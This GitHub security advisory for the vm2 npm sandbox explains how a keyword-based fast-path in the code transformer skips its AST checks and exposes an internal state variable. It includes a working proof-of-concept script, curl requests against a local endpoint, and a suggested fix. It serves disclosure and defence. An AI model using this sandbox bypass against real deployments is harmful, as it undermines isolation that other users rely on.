# [M] vm2's Transformer Fast-Path Bypass Exposes Internal State Variable

## Summary
Severity: Medium
Advisory: GHSA-wp5r-2gw5-m7q7
CVE: CVE-2026-44003
CWE: CWE-693
Ecosystem: npm
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N (CVSS_V3)
Published: 2026-05-07
Source: https://github.com/advisories/GHSA-wp5r-2gw5-m7q7
Type: github-advisory

## Affected
- npm: `vm2` — affected >=0 <3.11.0

## Details
### Summary
vm2's code transformer has a performance optimization that skips AST analysis when the code does not contain `catch`, `import`, or `async` keywords. This fast-path bypass allows sandboxed code to directly access the internal `VM2_INTERNAL_STATE_DO_NOT_USE_OR_PROGRAM_WILL_FAIL` variable, which exposes internal security functions (`handleException`, `wrapWith`, `import`).

### Details
In `lib/transformer.js:55-57`, a regex check `/\b(?:catch|import|async)\b/` determines whether AST transformation is needed. If the code does not contain any of these keywords, the transformer returns the code unmodified.

When the fast-path is taken:
1. **INTERNAL_STATE_NAME identifier check is bypassed**: The AST visitor that blocks access to `VM2_INTERNAL_STATE_DO_NOT_USE_OR_PROGRAM_WILL_FAIL` never runs
2. **`with` statement instrumentation is bypassed**: `with()` statements are not wrapped with `wrapWith()`, enabling scope manipulation
3. The internal state object exposes: `handleException(e)`, `wrapWith(x)`, `import(what)`

While these methods are currently defensive utilities (not direct escape vectors), this represents a complete bypass of a security control. Any future addition of a sensitive method to the internal state object would be immediately exploitable.

### PoC

**Library-level PoC (Node.js script — primary):**
```javascript
const { VM } = require("vm2");
const vm = new VM();

// Access internal state (bypassed — no catch/import/async keywords)
const result = vm.run(`
  var x = VM2_INTERNAL_STATE_DO_NOT_USE_OR_PROGRAM_WILL_FAIL;
  Object.keys(x).join(",")
`);
console.log(result); // "wrapWith,handleException,import"

// Control test — blocked when catch keyword is present
try {
  vm.run(`
    try {
      var x = VM2_INTERNAL_STATE_DO_NOT_USE_OR_PROGRAM_WILL_FAIL;
    } catch(e) { e.message }
  `);
} catch(e) {
  console.log(e.message); // "Use of internal vm2 state variable"
}
```

**HTTP demonstration:**
```bash
# Internal state access (bypassed)
curl -s -X POST http://localhost:3000/api/execute \
  -H "Content-Type: application/json" \
  -d '{"code":"var x = VM2_INTERNAL_STATE_DO_NOT_USE_OR_PROGRAM_WILL_FAIL; Object.keys(x).join(\",\")"}'
# Result: "wrapWith,handleException,import"

# Control test — blocked when catch keyword is present
curl -s -X POST http://localhost:3000/api/execute \
  -H "Content-Type: application/json" \
  -d '{"code":"try { var x = VM2_INTERNAL_STATE_DO_NOT_USE_OR_PROGRAM_WILL_FAIL; } catch(e) { e.message }"}'
# Result: {"errors":["Use of internal vm2 state variable"]}
```

**Suggested fix:**
```javascript
// transformer.js:55 — add 'with' keyword and INTERNAL_STATE_NAME check
if (!/\b(?:catch|import|async|with)\b/.test(code) && code.indexOf(INTERNAL_STATE_NAME) === -1) {
    return {__proto__: null, code, hasAsync: false};
}
```

### Impact
- **Security Control Bypass**: The INTERNAL_STATE_NAME access restriction is completely ineffective when the code avoids 3 specific keywords.
- **Defense-in-Depth Violation**: Internal security functions are exposed, creating a latent attack surface for future code changes.
- **Scope**: All applications using vm2. No special configuration required.

## References
- https://github.com/patriksimek/vm2/security/advisories/GHSA-wp5r-2gw5-m7q7
- https://nvd.nist.gov/vuln/detail/CVE-2026-44003
- https://github.com/patriksimek/vm2
- https://github.com/patriksimek/vm2/releases/tag/v3.11.0
